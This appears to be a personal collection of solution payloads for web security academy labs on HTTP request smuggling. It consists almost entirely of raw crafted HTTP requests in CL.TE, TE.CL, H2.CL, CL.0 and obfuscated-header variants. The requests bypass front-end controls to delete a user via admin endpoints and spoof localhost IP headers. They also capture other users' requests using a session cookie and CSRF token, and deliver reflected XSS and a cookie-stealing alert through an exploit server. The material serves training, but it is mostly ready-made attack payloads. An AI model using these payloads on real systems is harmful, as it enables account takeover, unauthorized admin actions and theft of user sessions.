# Lab: HTTP request smuggling, confirming a CL.TE vulnerability via differential responses

```http
POST / HTTP/1.1
Host: 0a8b008b049316a1856e820000b90058.web-security-academy.net
Sec-Ch-Ua: "Chromium";v="131", "Not_A Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 37
Transfer-Encoding: chunked

0


GET /404 HTTP/1.1
X-Ignore: X
```

# Lab: HTTP request smuggling, confirming a TE.CL vulnerability via differential responses

```http
POST / HTTP/1.1
Host: 0ad8006f045b711180628feb00620056.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

5e
POST /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

```

# Lab: Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability

```http
POST / HTTP/1.1
Host: 0a9a00c9035906cc80d885c30080005c.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Content-Length: 139
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
```

# Lab: Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability

```http
POST / HTTP/1.1
Host: 0a70005304907fda82457014002d00fe.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

89
POST /admin/delete/?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

```

# Lab: Exploiting HTTP request smuggling to reveal front-end request rewriting

CL.TE

With the Content-Length we got the Header for IP checking

```http
POST / HTTP/1.1
Host: 0a5d00d6047a7f1382317adb00b200d4.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 210
Transfer-Encoding: chunked

0


POST / HTTP/1.1
X-Remote-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 200

search=test
```

Final

```http
POST / HTTP/1.1
Host: 0a5d00d6047a7f1382317adb00b200d4.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 261
Transfer-Encoding: chunked

0


POST /admin/delete?username=carlos HTTP/1.1
X-Remote-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 13
X-xTBXBt-Ip: 127.0.0.1

search=test
```

# Lab: Exploiting HTTP request smuggling to capture other users' requests

```http
POST / HTTP/1.1
Host: 0acf00bd04840423849ce12200b8000a.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 241
Transfer-Encoding: chunked

0


POST /post/comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Cookie: session=NqXiybHJLEAaGhj2M1udeixBPKqZsQh8
Content-Length: 824

csrf=PHa52g3eA0xshkuuL4u4PWGVq55p37m2&postId=8&name=x&email=a@a.a&website=&comment=
```

With a real session cookie, CSRF token and a big Content-Length we con capture other users' request

# Lab: Exploiting HTTP request smuggling to deliver reflected XSS

```http
POST / HTTP/1.1
Host: 0ac50091038bea7780785327003e006b.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 152
Transfer-Encoding: chunked

0


GET /post?postId=2 HTTP/1.1
User-Agent: a"/><script>alert(1)</script>
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

x=1
```

# Lab: Response queue poisoning via H2.TE request smuggling

This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests even if they have an ambiguous length.

# Lab: CL.0 request smuggling

```http
POST / HTTP/2
Host: 0a4900f304755eab803c99fc00780050.web-security-academy.net
Cookie: session=08dEtE9eNrHA4ELzJN8s3VgkYuEztljH
Content-Type: application/x-www-form-urlencoded
Content-Length: CORRECT

GET /admin/delete?username=carlos HTTP/1.1
Foo: x
```

If the request after this request return normally then the file path is not vulnerability.

Try to exploit all the path that we found, until `/resources/images/blog.svg`

```http
POST /resources/images/blog.svg HTTP/2
Host: 0a4900f304755eab803c99fc00780050.web-security-academy.net
Cookie: session=08dEtE9eNrHA4ELzJN8s3VgkYuEztljH
Content-Type: application/x-www-form-urlencoded
Content-Length: CORRECT

GET /admin/delete?username=carlos HTTP/1.1
Foo: x
```

# Lab: HTTP request smuggling, basic CL.TE vulnerability

```http
POST / HTTP/1.1
Host: 0ac7009304a7e7d88057493e00ab00ab.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 8
Transfer-Encoding: chunked

0

G
```

# Lab: HTTP request smuggling, basic TE.CL vulnerability

```http
POST / HTTP/1.1
Host: 0aae001a0461881f8267b660009100ab.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

```

# Lab: HTTP request smuggling, obfuscating the TE header

```http
POST / HTTP/1.1
Host: 0a97003c04005bce8042c64000a20084.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked
Transfer-Encoding: x

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

```


# Lab: H2.CL request smuggling

```http
POST / HTTP/2
Host: 0adb001f0401c5c780ff68fa00b40070.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

GET /resources HTTP/1.1
Host: exploit-0aa500a90404c541803367d301060090.exploit-server.net
Content-Length: 5

x=1
```

Run with Intruder 1 request/time

Exploit server body:

```js
alert(document.cookie)
```

# Lab: HTTP/2 request smuggling via CRLF injection

